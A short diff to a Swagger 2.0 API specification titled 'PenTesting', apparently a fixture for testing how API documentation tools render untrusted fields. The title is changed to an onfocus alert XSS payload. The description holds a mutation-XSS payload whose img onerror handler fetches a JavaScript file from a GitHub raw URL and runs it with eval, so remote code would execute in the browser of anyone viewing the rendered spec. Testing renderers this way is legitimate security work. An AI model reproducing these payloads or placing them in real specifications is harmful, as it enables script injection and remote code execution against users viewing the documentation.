@@ -1,9 +1,9 @@
 swagger: '2.0'
 info:
-  title: PenTesting<a>alert(1)</a>
+  title: PenTesting<a href="#" onfocus="alert(1)" name="foo">test</a>
   description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/JackMarsden/Testing/main/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
   version: production
-basePath: /JSSResourc11/
+basePath: /JSSResourc2/
 produces:
   - application/xml
   - application/json
